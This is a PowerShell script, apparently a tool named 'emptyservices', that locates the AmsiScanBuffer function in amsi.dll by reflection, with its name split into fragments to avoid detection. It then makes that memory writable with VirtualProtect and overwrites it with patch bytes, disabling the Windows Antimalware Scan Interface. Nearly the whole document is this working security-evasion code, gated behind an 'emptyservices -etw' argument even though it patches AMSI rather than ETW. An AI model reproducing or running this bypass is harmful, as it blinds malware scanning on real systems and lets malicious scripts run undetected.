function emptyservices_LookupFunc {
    Param ($moduleName, $functionName)
    Write-Host "Searching for function '$functionName' in module '$moduleName'..."

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
     Equals('System.dll')
     }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    Write-Host "Assemblies found. Searching for methods..."

    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        If($_.Name -like "Ge*P*oc*ddress") {
            Write-Host "Method found: $($_.Name)"
            $tmp += $_
        }
    }
    Write-Host "Address method found, invoking..."

    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $functionName))
}


function emptyservices_getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]]
        $func, 
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    Write-Host "Creating delegate type for function..."

    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('emptyservicesDelegateType', 'Class, Public, Sealed, AnsiClass,
    AutoClass', [System.MulticastDelegate])

    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')

    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
    $func). SetImplementationFlags('Runtime, Managed')

    Write-Host "Delegate created successfully."

    return $type.CreateType()
}

# Ensuring only 'emptyservices -etw' will execute the script
param (
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateSet("emptyservices -etw", IgnoreCase = $true)]
    [string]$command
)

if ($command -eq "emptyservices -etw") {
    Write-Host "Command 'emptyservices -etw' recognized. Proceeding with execution..."

    $a = "A"
    $b = "msiS"
    $c = "canB"
    $d = "uffer"
    Write-Host "Combining function name components..."

    [IntPtr]$emptyservices_funcAddr = emptyservices_LookupFunc amsi.dll ($a + $b + $c + $d)
    Write-Host "Function address obtained: $emptyservices_funcAddr"

    $emptyservices_oldProtectionBuffer = 0
    Write-Host "Getting delegate for VirtualProtect..."

    $emptyservices_vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((emptyservices_LookupFunc kernel32.dll VirtualProtect), (emptyservices_getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
    Write-Host "Changing memory permissions..."

    $emptyservices_vp.Invoke($emptyservices_funcAddr, 3, 0x40, [ref]$emptyservices_oldProtectionBuffer)

    $emptyservices_buf = [Byte[]] (0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3)
    Write-Host "Copying bytes to function address..."

    [System.Runtime.InteropServices.Marshal]::Copy($emptyservices_buf, 0, $emptyservices_funcAddr, 12)

    Write-Host "Operation completed successfully."
} else {
    Write-Host "Invalid command. Only 'emptyservices -etw' is allowed."
}
